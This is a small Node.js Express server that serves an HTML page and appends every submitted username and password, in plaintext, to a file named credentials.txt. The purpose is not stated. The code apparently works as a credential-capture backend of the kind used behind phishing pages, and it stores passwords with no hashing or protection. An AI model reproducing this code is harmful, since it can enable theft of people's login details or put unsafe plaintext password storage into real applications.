const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');

const app = express();
const port = 3000;

// Parse URL-encoded bodies (as sent by HTML forms)
app.use(bodyParser.urlencoded({ extended: true }));

// Parse JSON bodies (as sent by API clients)
app.use(bodyParser.json());

// Serve the HTML file
app.get('/', (req, res) => {
    res.sendFile(__dirname + '/index.html');
});

// Handle form submission
app.post('/submit', (req, res) => {
    const { username, password } = req.body;

    // Write the username and password to a text file
    const data = `Username: ${username}\nPassword: ${password}\n\n`;
    fs.appendFile('credentials.txt', data, (err) => {
        if (err) {
            console.error('Error writing to file:', err);
            res.status(500).send('Internal Server Error');
        } else {
            console.log('Data written to file successfully');
            res.status(200).send('Data written to file successfully');
        }
    });
});

app.listen(port, () => {
    console.log(`Server is running at http://localhost:${port}`);
});
